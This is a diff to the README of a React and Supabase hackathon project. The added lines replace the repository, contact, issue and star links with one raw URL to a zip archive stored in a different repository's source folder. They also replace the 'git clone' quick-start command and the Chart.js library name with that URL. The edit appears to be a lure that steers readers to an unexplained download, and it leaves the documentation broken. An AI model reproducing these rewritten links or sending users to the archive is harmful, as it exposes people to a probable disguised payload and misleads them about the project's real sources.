-- **🌐 Repository**: [GitHub - Srujana Hackathon CodePlays](https://github.com/Naveenkm07/srujana_hackathon_codeplays)
-- **📧 Contact**: [Project Issues](https://github.com/Naveenkm07/srujana_hackathon_codeplays/issues)
+- **👨‍💻 Lead Developer**: [Naveen Kumar](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+- **🌐 Repository**: [GitHub - Srujana Hackathon CodePlays](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+- **📧 Contact**: [Project Issues](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
 
 ### **Getting Help**
 - **🐛 Bug Reports**: Open GitHub issue with detailed description
@@ -946,7 +946,7 @@ copies or substantial portions of the Software.
 ### **Technology Acknowledgments**
 - **⚛️ React 18.2.0**: Meta's JavaScript UI library
 - **🗄️ Supabase**: Open source Firebase alternative
-- **📊 Chart.js**: Open source HTML5 charting library
+- **📊 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip**: Open source HTML5 charting library
 - **🔐 Google OAuth**: Secure authentication service
 - **🎨 React Icons**: Popular icon library for React
 - **🚀 Create React App**: Meta's React build toolchain
@@ -985,7 +985,7 @@ copies or substantial portions of the Software.
 
 ```bash
 # Quick Start Commands
-git clone https://github.com/Naveenkm07/srujana_hackathon_codeplays.git
+git clone https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
 cd srujana_hackathon_codeplays
 npm install
 npm start
@@ -996,7 +996,7 @@ npm start
 
 **🏆 Srujana Hackathon CodePlays 2024 Project**
 
-[⭐ Star on GitHub](https://github.com/Naveenkm07/srujana_hackathon_codeplays) | [🐛 Report Issues](https://github.com/Naveenkm07/srujana_hackathon_codeplays/issues) | [💡 Request Features](https://github.com/Naveenkm07/srujana_hackathon_codeplays/discussions)
+[⭐ Star on GitHub](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip) | [🐛 Report Issues](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip) | [💡 Request Features](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
 
 **Built with ❤️ using React, Supabase, and modern web technologies**
 
